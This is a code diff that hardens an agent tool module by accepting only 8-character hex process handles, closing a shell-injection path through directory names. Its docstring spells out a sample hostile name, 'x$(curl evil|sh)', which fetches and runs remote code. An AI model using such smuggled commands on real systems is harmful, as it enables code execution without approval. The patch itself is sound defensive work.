@@ -44,7 +44,7 @@ import shlex
 from dataclasses import dataclass
 from typing import Any
 
-from pydantic import BaseModel
+from pydantic import BaseModel, field_validator
 
 from domyn.agents.tools.builtin.session import safe_id
 
@@ -115,6 +115,15 @@ below it, so one conversation cannot read another's logs through the file
 tools, and so everything a conversation left behind can be found — and one
 day removed — as a unit."""
 
+HANDLE = re.compile(r"[0-9a-f]{8}")
+"""What every handle looks like: ``new_record`` makes them, four random bytes in
+hex. Handles also come back from places this module did not write — a directory
+listing (``build_discover``), a stored ``state`` — and are put into shell lines
+(the markers of ``_report``, ``build_sweep``), some inside double quotes, where
+``$(…)`` still runs. A directory named ``x$(curl evil|sh)`` under ``HOME`` would
+otherwise run that command from ``list_commands`` and ``check_command``, which
+ask no approval. So nothing else is accepted as a handle."""
+
 
 class ProcessRecord(BaseModel):
     """What survives a turn, and therefore what has to be JSON.
@@ -139,6 +148,13 @@ class ProcessRecord(BaseModel):
     cursor: int = 0
     """Bytes of stdout already shown to the model."""
     err_cursor: int = 0
+
+    @field_validator("handle")
+    @classmethod
+    def _handle_is_ours(cls, value: str) -> str:
+        if not HANDLE.fullmatch(value):
+            raise ValueError("not a handle this module made")
+        return value
 
     @property
     def dir(self) -> str:
@@ -612,6 +628,9 @@ def parse_discover(output: str) -> dict[str, dict[str, Any]]:
         if len(bits) < 2:
             continue
         kind, handle = bits[0], bits[1]
+        # A directory name, so anything at all: see HANDLE.
+        if not HANDLE.fullmatch(handle):
+            continue
         if kind == "P":
             facts = parse_sweep(f"{handle} {bits[2] if len(bits) > 2 else ''}")
             if handle in facts:
